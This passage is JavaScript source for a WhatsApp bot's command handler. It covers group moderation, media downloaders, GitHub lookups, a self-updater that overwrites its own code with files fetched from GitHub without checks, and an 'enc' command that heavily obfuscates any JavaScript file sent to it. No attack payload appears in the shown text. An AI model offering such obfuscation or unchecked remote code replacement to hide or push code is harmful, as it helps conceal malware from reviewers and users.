└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    } else if (args[0] === 'off') {
        global.antilink = false;
        reply(`┌⪼❏ ANTILINK
├◆ Status: OFF
├◆ Links are now allowed
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    } else {
        reply(`┌⪼❏ ANTILINK
├◆ USAGE: .antilink on/off
├◆ Current Status: ${global.antilink ? 'ON' : 'OFF'}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= WARN USER ======================
case 'warn': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can warn users
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
    if (!user) return reply(`┌⪼❏ WARN
├◆ Tag or reply to user to warn
├◆ USAGE: .warn @user reason
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let reason = text.replace(/@\d+/g, '').trim() || 'No reason provided';
    let groupWarnings = global.warnings[m.chat] || {};
    groupWarnings[user] = (groupWarnings[user] || 0) + 1;
    global.warnings[m.chat] = groupWarnings;
    
    let warnCount = groupWarnings[user];
    
    if (warnCount >= 3) {
        try {
            await minato.groupParticipantsUpdate(m.chat, [user], 'remove');
            delete groupWarnings[user];
            global.warnings[m.chat] = groupWarnings;
            reply(`┌⪼❏ USER KICKED
├◆ User: @${user.split('@')[0]}
├◆ Reason: 3/3 warnings reached
├◆ ${reason}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        } catch {
            reply(`┌⪼❏ WARNING ${warnCount}/3
├◆ User: @${user.split('@')[0]}
├◆ Reason: ${reason}
├◆ Failed to kick (Bot needs admin)
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
    } else {
        reply(`┌⪼❏ WARNING ${warnCount}/3
├◆ User: @${user.split('@')[0]}
├◆ Reason: ${reason}
├◆ ${3 - warnCount} warnings until kick
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= RESET WARNINGS ======================
case 'resetwarn':
case 'unwarn': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can reset warnings
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
    if (!user) return reply(`┌⪼❏ RESET WARNINGS
├◆ Tag or reply to user to reset warnings
├◆ USAGE: .resetwarn @user
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let groupWarnings = global.warnings[m.chat] || {};
    delete groupWarnings[user];
    global.warnings[m.chat] = groupWarnings;
    
    reply(`┌⪼❏ WARNINGS RESET
├◆ User: @${user.split('@')[0]}
├◆ All warnings cleared
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
}
break;

// ================= CHECK WARNINGS ======================
case 'checkwarn':
case 'warnings': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender) || m.sender;
    let groupWarnings = global.warnings[m.chat] || {};
    let warnCount = groupWarnings[user] || 0;
    
    reply(`┌⪼❏ WARNINGS CHECK
├◆ User: @${user.split('@')[0]}
├◆ Warnings: ${warnCount}/3
├◆ Status: ${warnCount >= 3 ? 'SHOULD BE KICKED' : 'ACTIVE'}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
}
break;
// ================= ( Case Public )=====================
 case "public":{
 if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
minato.public = true
 reply("*successfully changed to Public Mode*")
 }
 break;                         
// ================= SAVE STATUS ======================
case 'savestatus':
case 'save':
case 'ss': {
    if (!m.quoted) return reply(`┌⪼❏ STATUS SAVER
├◆ Please reply to a status message
├◆ 
├◆ USAGE:
├◆ Reply to status with .savestatus
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        
        let quoted = m.quoted;
        let type = quoted.mtype || '';
        
        if (type === 'imageMessage' || type === 'extendedTextMessage' && quoted.text) {
            // Image status
            let media = await quoted.download();
            await minato.sendMessage(m.chat, {
                image: media,
                caption: `┌⪼❏ STATUS SAVED
├◆ Type: Image
├◆ From: @${quoted.sender.split('@')[0]}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
                mentions: [quoted.sender]
            }, { quoted: m });
            
        } else if (type === 'videoMessage') {
            // Video status
            let media = await quoted.download();
            await minato.sendMessage(m.chat, {
                video: media,
                caption: `┌⪼❏ STATUS SAVED
├◆ Type: Video
├◆ From: @${quoted.sender.split('@')[0]}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
                mentions: [quoted.sender]
            }, { quoted: m });
            
        } else if (type === 'audioMessage') {
            // Audio status
            let media = await quoted.download();
            await minato.sendMessage(m.chat, {
                audio: media,
                mimetype: 'audio/mp4',
                caption: `┌⪼❏ STATUS SAVED
├◆ Type: Audio
├◆ From: @${quoted.sender.split('@')[0]}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
                mentions: [quoted.sender]
            }, { quoted: m });
            
        } else {
            return reply(`┌⪼❏ STATUS SAVER
├◆ Unsupported media type
├◆ Type: ${type}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
        
        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (err) {
        console.error('Save status error:', err);
        reply(`┌⪼❏ ERROR
├◆ Failed to save status
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;
// ================= PROMOTE ======================
case 'promote': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can use this command
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
├◆ Bot must be admin to promote
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
    if (!user) return reply(`┌⪼❏ PROMOTE
├◆ Tag or reply to user to promote
├◆ USAGE: .promote @user
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.groupParticipantsUpdate(m.chat, [user], 'promote');
        reply(`┌⪼❏ PROMOTED
├◆ User: @${user.split('@')[0]}
├◆ Status: Now an admin
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to promote user
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= DEMOTE ======================
case 'demote': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can use this command
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
├◆ Bot must be admin to demote
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
    if (!user) return reply(`┌⪼❏ DEMOTE
├◆ Tag or reply to user to demote
├◆ USAGE: .demote @user
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.groupParticipantsUpdate(m.chat, [user], 'demote');
        reply(`┌⪼❏ DEMOTED
├◆ User: @${user.split('@')[0]}
├◆ Status: No longer admin
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to demote user
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= ADD MEMBER ======================
case 'add': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can use this command
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
├◆ Bot must be admin to add members
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let user = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (!user || user === '@s.whatsapp.net') return reply(`┌⪼❏ ADD MEMBER
├◆ Please provide a valid number
├◆ USAGE: .add 2347030626048
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.groupParticipantsUpdate(m.chat, [user], 'add');
        reply(`┌⪼❏ MEMBER ADDED
├◆ User: @${user.split('@')[0]}
├◆ Successfully added to group
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to add user
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= GROUP LINK ======================
case 'gclink':
case 'linkgc':
case 'grouplink': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can use this command
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
├◆ Bot must be admin to get group link
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        let code = await minato.groupInviteCode(m.chat);
        let link = 'https://chat.whatsapp.com/' + code;
        reply(`┌⪼❏ GROUP LINK
├◆ Group: ${groupName}
├◆ Link: ${link}
├◆ Code: ${code}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to get group link
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= REVOKE LINK ======================
case 'revoke':
case 'resetlink': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can use this command
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
├◆ Bot must be admin to revoke link
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.groupRevokeInvite(m.chat);
        reply(`┌⪼❏ LINK REVOKED
├◆ Group: ${groupName}
├◆ Old invite link has been revoked
├◆ Use .gclink to get new link
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to revoke link
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= GROUP INFO ======================
case 'groupinfo':
case 'ginfo': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let totalAdmins = groupAdmins.length;
    let created = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    reply(`┌⪼❏ GROUP INFO
├◆ Name: ${groupName}
├◆ ID: ${m.chat}
├◆ Created: ${created}
├◆ Total Members: ${participants.length}
├◆ Admins: ${totalAdmins}
├◆ Owner: @${groupMetadata.owner?.split('@')[0] || 'Unknown'}
├◆ Description: ${groupMetadata.desc || 'None'}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
}
break;

// ================= HIDETAG ======================
case 'hidetag':
case 'ht': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can use this command
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    let message = text || 'Hello everyone!';
    let mentions = participants.map(p => p.id);
    
    await minato.sendMessage(m.chat, {
        text: message,
        mentions: mentions
    }, { quoted: m });
}
break;

// ================= DELETE MESSAGE ======================
case 'delete':
case 'del':
case 'd': {
    if (!m.quoted) return reply(`┌⪼❏ DELETE
├◆ Reply to the message you want to delete
├◆ USAGE: Reply to message with .delete
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { delete: m.quoted.key });
        await minato.sendMessage(m.chat, { delete: m.key });
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to delete message
├◆ Bot must be admin or message must be from bot
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;
// ================= TWITTER/X DOWNLOAD ======================
case 'twitter':
case 'x':
case 'twt': {
    if (!text) return reply(`┌⪼❏ TWITTER DL
├◆ Please provide a Twitter/X URL
├◆ USAGE: .twitter https://twitter.com/user/status/xxx
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        let res = await axios.get(`https://api.vreden.my.id/api/twitter?url=${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (data.result && data.result.url) {
            await minato.sendMessage(m.chat, {
                video: { url: data.result.url },
                caption: `┌⪼❏ TWITTER DOWNLOADED
├◆ Quality: ${data.result.quality || 'HD'}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
            }, { quoted: m });
            await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            reply(`┌⪼❏ ERROR
├◆ No media found in this tweet
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to download Twitter media
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= SPOTIFY DOWNLOAD ======================
case 'spotify':
case 'spoty': {
    if (!text) return reply(`┌⪼❏ SPOTIFY DL
├◆ Please provide a Spotify URL
├◆ USAGE: .spotify https://open.spotify.com/track/xxx
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        let res = await axios.get(`https://api.vreden.my.id/api/spotifydl?url=${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (data.result && data.result.download) {
            await minato.sendMessage(m.chat, {
                audio: { url: data.result.download },
                mimetype: 'audio/mp4',
                caption: `┌⪼❏ SPOTIFY DOWNLOADED
├◆ Title: ${data.result.title || 'Unknown'}
├◆ Artist: ${data.result.artist || 'Unknown'}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
            }, { quoted: m });
            await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            reply(`┌⪼❏ ERROR
├◆ Failed to download from Spotify
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to download Spotify track
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= MEDIAFIRE DOWNLOAD ======================
case 'mediafire':
case 'mf': {
    if (!text) return reply(`┌⪼❏ MEDIAFIRE DL
├◆ Please provide a MediaFire URL
├◆ USAGE: .mediafire https://www.mediafire.com/file/xxx
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        let res = await axios.get(`https://api.vreden.my.id/api/mediafiredl?url=${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (data.result && data.result.url) {
            reply(`┌⪼❏ MEDIAFIRE DOWNLOADED
├◆ Filename: ${data.result.filename}
├◆ Size: ${data.result.filesize}
├◆ Type: ${data.result.filetype}
├◆ Link: ${data.result.url}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
            await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            reply(`┌⪼❏ ERROR
├◆ Failed to get MediaFire file
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to download from MediaFire
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= PINTEREST DOWNLOAD ======================
case 'pinterest':
case 'pin': {
    if (!text) return reply(`┌⪼❏ PINTEREST DL
├◆ Please provide a Pinterest URL
├◆ USAGE: .pinterest https://pin.it/xxx
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        let res = await axios.get(`https://api.vreden.my.id/api/pinterestdl?url=${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (data.result && data.result.url) {
            await minato.sendMessage(m.chat, {
                image: { url: data.result.url },
                caption: `┌⪼❏ PINTEREST DOWNLOADED
├◆ Title: ${data.result.title || 'Unknown'}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
            }, { quoted: m });
            await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            reply(`┌⪼❏ ERROR
├◆ Failed to download from Pinterest
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Failed to download Pinterest media
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;
// ================= GITHUB STALK ======================
case 'githubstalk':
case 'ghstalk': {
    if (!text) return reply(`┌⪼❏ GITHUB STALK
├◆ Please provide a GitHub username
├◆ USAGE: .githubstalk username
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        let res = await axios.get(`https://api.github.com/users/${text}`);
        let data = res.data;
        
        let result = `┌⪼❏ GITHUB USER
├◆ Username: ${data.login}
├◆ Name: ${data.name || 'Not set'}
├◆ Bio: ${data.bio || 'None'}
├◆ Followers: ${data.followers}
├◆ Following: ${data.following}
├◆ Public Repos: ${data.public_repos}
├◆ Public Gists: ${data.public_gists}
├◆ Blog: ${data.blog || 'None'}
├◆ Location: ${data.location || 'Unknown'}
├◆ Twitter: ${data.twitter_username || 'None'}
├◆ Company: ${data.company || 'None'}
├◆ Created: ${new Date(data.created_at).toLocaleDateString()}
├◆ Updated: ${new Date(data.updated_at).toLocaleDateString()}
├◆ Profile: ${data.html_url}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`;
        
        await minato.sendMessage(m.chat, {
            image: { url: data.avatar_url },
            caption: result
        }, { quoted: m });
        
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ User not found or API error
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= GITHUB REPO INFO ======================
case 'ghrepo':
case 'repoinfo': {
    if (!text) return reply(`┌⪼❏ GITHUB REPO
├◆ Please provide username/repo
├◆ USAGE: .ghrepo username/repository
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        let res = await axios.get(`https://api.github.com/repos/${text}`);
        let data = res.data;
        
        let result = `┌⪼❏ REPOSITORY INFO
├◆ Name: ${data.full_name}
├◆ Description: ${data.description || 'None'}
├◆ Stars: ${data.stargazers_count}
├◆ Forks: ${data.forks_count}
├◆ Watchers: ${data.watchers_count}
├◆ Issues: ${data.open_issues_count}
├◆ Language: ${data.language || 'Unknown'}
├◆ License: ${data.license?.name || 'None'}
├◆ Default Branch: ${data.default_branch}
├◆ Created: ${new Date(data.created_at).toLocaleDateString()}
├◆ Updated: ${new Date(data.updated_at).toLocaleDateString()}
├◆ Topics: ${data.topics?.join(', ') || 'None'}
├◆ URL: ${data.html_url}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`;
        
        await minato.sendMessage(m.chat, {
            image: { url: data.owner.avatar_url },
            caption: result
        }, { quoted: m });
        
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Repository not found or API error
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= GITHUB SEARCH ======================
case 'ghsearch':
case 'github': {
    if (!text) return reply(`┌⪼❏ GITHUB SEARCH
├◆ Please provide a search query
├◆ USAGE: .ghsearch whatsapp-bot
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        let res = await axios.get(`https://api.github.com/search/repositories?q=${encodeURIComponent(text)}&per_page=5`);
        let data = res.data;
        
        if (data.items && data.items.length > 0) {
            let repos = data.items.slice(0, 5).map((repo, i) => 
                `${i + 1}. ${repo.full_name}
   Stars: ${repo.stargazers_count} | Forks: ${repo.forks_count}
   ${repo.description ? repo.description.slice(0, 60) + '...' : 'No description'}
   ${repo.html_url}`
            ).join('\n\n');
            
            reply(`┌⪼❏ GITHUB SEARCH
├◆ Query: ${text}
├◆ Total Results: ${data.total_count}
├◆
${repos}
├◆
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        } else {
            reply(`┌⪼❏ NO RESULTS
├◆ No repositories found for: ${text}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
    } catch (err) {
        reply(`┌⪼❏ ERROR
├◆ Search failed
├◆ ${err.message}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;
// ================= UPDATE BOT ======================
case 'update':
case 'upgrade': {
    if (!isCreator) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only bot owner can update
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    reply(`┌⪼❏ UPDATE CHECK
├◆ Checking for updates...
├◆ Current Version: ${global.versionBot}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        let res = await axios.get('https://api.github.com/repos/KNOXPRIME/NULL-CRASH/contents/package.json');
        let content = Buffer.from(res.data.content, 'base64').toString();
        let remote = JSON.parse(content);
        
        if (remote.version !== global.versionBot) {
            reply(`┌⪼❏ UPDATE AVAILABLE
├◆ Current Version: ${global.versionBot}
├◆ New Version: ${remote.version}
├◆
├◆ Updating bot...
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
            
            // Download and replace files
            let files = ['index.js', 'null.js', 'settings.js', 'package.json'];
            for (let file of files) {
                try {
                    let fileRes = await axios.get(`https://raw.githubusercontent.com/KNOXPRIME/NULL-CRASH/main/${file}`);
                    fs.writeFileSync(`./${file}`, fileRes.data);
                } catch (e) {
                    console.log(`Failed to update ${file}:`, e.message);
                }
            }
            
            reply(`┌⪼❏ UPDATE COMPLETE
├◆ Bot updated to version ${remote.version}
├◆ Restarting in 3 seconds...
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
            
            setTimeout(() => process.exit(0), 3000);
            
        } else {
            reply(`┌⪼❏ UP TO DATE
├◆ Version: ${global.versionBot}
├◆ No updates available
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
    } catch (err) {
        reply(`┌⪼❏ UPDATE FAILED
├◆ Could not check for updates
├◆ Error: ${err.message}
├◆ Check your GitHub repo settings
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= ( Case enc )=====================
case 'enc':
case 'nullenc':
case 'encrypt': {
const JsConfuser = require('js-confuser')

if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
return reply('❌ Please Reply File To Be Encryption.');
}
const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
const quotedDocument = quotedMessage.documentMessage;
if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
return reply('❌ Please Reply File To Be Encryption.');
}
try {
const fileName = quotedDocument.fileName;
const docBuffer = await m.quoted.download();
if (!docBuffer) {
return reply('❌ Please Reply File To Be Encryption.');
}
await minato.sendMessage(m.chat, {
 react: { text: '🕛', key: m.key }
 });
const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
target: "node",
preset: "high",
compact: true,
minify: true,
flatten: true,
identifierGenerator: function () {
const originalString = "素DET晴NULLXMD晴" + "素CODEBREAKER晴NULL晴";
const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素CODEBREAKER晴DEVNULL晴]/g, "");
const randomString = (length) => {
let result = "";
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result;
};
return removeUnwantedChars(originalString) + randomString(2);
},
renameVariables: true,
renameGlobals: true,
stringEncoding: true,
stringSplitting: 0.0,
stringConcealing: true,
stringCompression: true,
duplicateLiteralsRemoval: 1.0,
shuffle: { hash: 0.0, true: 0.0 },
stack: true,
controlFlowFlattening: 1.0,
opaquePredicates: 0.9,
deadCode: 0.0,
dispatcher: true,
rgf: false,
calculator: true,
hexadecimalNumbers: true,
movedDeclarations: true,
objectExtraction: true,
globalConcealing: true,
});
await minato.sendMessage(m.chat, {
document: Buffer.from(obfuscatedCode, 'utf-8'),
mimetype: 'application/javascript',
fileName: `${fileName}`,
caption: `•Successful Encrypt
•Type: Hard Code
> © 2026 𝗝𝗘𝗔𝗡 𝗦𝗧𝗘𝗣𝗛 𝗠𝗗-𝗫`,
}, { quoted: HKQuoted });

} catch (err) {
console.error('Error during encryption:', err);
await reply(`An error occurred: ${err.message}`);
}
}
break;
// ================= ( Case auto typing )=====================
case 'autotyping': {
    if (!isCreator) return reply("Owner only");

    global.settings.autoTyping = args[0] === 'on';
    reply(`⌨️ AutoTyping ${global.settings.autoTyping ? 'ON' : 'OFF'}`);
}
break;
// ================= ( Case auto view status)=====================
case 'autoviewstatus': {
    if (!isCreator) return reply("Owner only");

    if (args[0] === 'on') global.settings.autoViewStatus = true;
    else if (args[0] === 'off') global.settings.autoViewStatus = false;
    else return reply("Ex: autoviewstatus on/off");

    reply(`👀 AutoViewStatus ${global.settings.autoViewStatus ? 'ON' : 'OFF'}`);
}
break;
// ================= ( Case tag all )=====================
case 'tagall': {
    if (!isGroup) return reply('Group specific features!');

    let teks = `*👥 HELLO EVERYONE*\n\n`;
    let count = 1;

    for (let mem of participants) {
        teks += `${count}. 🎧 @${mem.id.split('@')[0]}\n`;
        count++;
    }

    let ppuser;
    try {
        ppuser = await minato.profilePictureUrl(m.sender, 'image');
    } catch {
        ppuser = 'https://files.lordobitotech.xyz/mediafiles/911dcf24-50c6-47e5-bff6-31541fffd81b.jpg';
    }
    
    await minato.sendMessage(m.chat, {
        image: { url: ppuser },
        caption: teks,
         contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363402881295184@newsletter',
                    newsletterName: '¿? JEAN STEPH TECH ¿?',
                    serverMessageId: 143
                }
            },
        mentions: participants.map(a => a.id)
    }, {
        quoted: m
    });
}
break;
// ================= ( Case kick )=====================
case 'kick': {
    if (!m.isGroup) return reply('Group only');
    if (!isAdmins) return reply('Admin only');
    if (!isBotAdmins) return reply('NULLXMD must be admin');

    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);

    if (!user) return reply('❌ Tag or reply user');

    await minato.groupParticipantsUpdate(m.chat, [user], 'remove');

    reply('✅ User removed');
}
break;
// ================= ( Case unmute gc )=====================
case 'unmute': {
    if (!m.isGroup) return reply('Group only');
    if (!isAdmins) return reply('Admin only');
    if (!isBotAdmins) return reply('Bot must be admin');

    await minato.groupSettingUpdate(m.chat, 'not_announcement');

    reply('🔊 Group opened');
}
break;     
// ================= ( Case mute gc)=====================
